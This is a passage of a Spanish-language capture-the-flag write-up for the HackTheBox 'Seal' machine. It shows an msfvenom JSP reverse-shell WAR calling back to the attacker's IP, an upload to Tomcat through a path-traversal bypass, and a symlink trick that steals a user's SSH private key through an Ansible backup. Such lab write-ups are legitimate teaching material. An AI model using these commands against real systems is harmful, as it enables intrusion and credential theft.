### MSFvenom
Me preparo un war malicioso con msfvenom.

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.101 LPORT=443 -f war > noname_rev.war`

Subo el archivo `noname_rev.war` con el uploader de tomcat...

![](/assets/images/htb-Seal/otroForbidden.png)

Siguiendo la metodología del path traversal.

![](/assets/images/htb-Seal/mensaje.png)

Abro burpsuite para mandar la petición via POST.

![](/assets/images/htb-Seal/burpsuiteUploadBypass.png)

Dejo a la escucha un netcat con el puerto 443.

```bash
# nc -lvnp 443
```

Lanzo el archivo noname_war desde el gestor de aplicaciones.

![](/assets/images/htb-Seal/noname_war.png)

Consigo una reverse shell y hago el tratamiento de la tty.

![](/assets/images/htb-Seal/shellSeal.png)

Enumero el sistema con `ps` para ver si existe alguna tarea.
```bash
ps -oe command
bash
/usr/sbin/CRON -f
/bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
sleep 30
```

Con `ls` miro los permisos del archivo.
```bash
tomcat@seal:/$ ls -la /opt/backups/playbook/run.yml
-rw-rw-r-- 1 luis luis 403 May  7  2021 /opt/backups/playbook/run.yml
```

Como tengo permiso de lectura abro el  fichero run.yml para ver su contenido.
```bash
tomcat@seal:/$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Ahora miro la ruta `/opt/backups/archives` que es donde se guarda el backup.

```bash
tomcat@seal:/$ ls -l /opt/backups/archives
total 1776
-rw-rw-r-- 1 luis luis 606047 Nov 16 16:10 backup-2021-11-16-16:10:32.gz
```

Contenido de los archivos que copia para hacer el backup.
```bash
tomcat@seal:/$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
total 100
drwxr-xr-x 7 root root  4096 May  7  2021 .
drwxr-xr-x 3 root root  4096 May  6  2021 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6  2021 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7  2021 uploads
```

El directorio uploads tiene permisos de escritura para otros, me muevo al directorio uploads y creo un enlace simbólico apuntando a la clave rsa del usuario luis.
```bash
ln -s /home/luis/.ssh/id_rsa id_rsa
```

Con watch veo en tiempo real cuando se crea el archivo en el directorio `/opt/backups/archives`
```bash
watch -n 1 ls -l /opt/backups/archives
```

Cuando se crea el archivo hay que copiarlo rápido a otro directorio tenemos un minuto.
```bash
cd /opt/backups/archives
cp backup-2021-11-16-17 12 33.gz /tmp
cd /tmp
python3 -m http.server 10000
```

Me descargo el archivo `backup` en mi equipo, lo descomprimo y dentro encuentro el id_rsa.
```bash
chmod 600 id_rsa
ssh -i id_rsa luis@10.10.10.250
```

Consigo conectarme al sistema como usuario luis y obtengo la flag de user.
```bash
luis@seal:~$ cat user.txt 
61****************************4f
```
